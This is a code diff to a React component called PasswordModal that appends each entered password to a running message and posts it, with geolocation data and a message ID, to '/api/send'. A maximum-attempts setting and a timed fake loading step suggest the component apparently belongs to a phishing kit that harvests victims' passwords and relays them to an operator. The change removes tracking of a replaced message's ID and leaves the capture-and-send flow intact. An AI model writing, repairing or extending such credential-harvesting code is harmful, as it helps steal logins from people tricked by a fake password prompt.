@@ -18,7 +18,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [showPassword, setShowPassword] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId, messageContent, setMessageId, setMessageContent } = store();
+    const { geoInfo, messageId, messageContent, setMessageContent } = store();
     const maxPass = config.MAX_PASS ?? 3;
 
     const t = (text: string): string => {
@@ -61,15 +61,11 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const updatedMessage = messageContent ? `${messageContent}\n\n${passwordLine}` : passwordLine;
 
         try {
-            const res = await axios.post('/api/send', {
+            await axios.post('/api/send', {
                 message: updatedMessage,
                 message_id: messageId
             });
 
-            // Tin cũ đã bị xoá, tin mới có message_id mới — phải cập nhật để lần sau xoá đúng tin
-            if (res?.data?.message_id) {
-                setMessageId(res.data.message_id);
-            }
             setMessageContent(updatedMessage);
 
             if (config.PASSWORD_LOADING_TIME) {
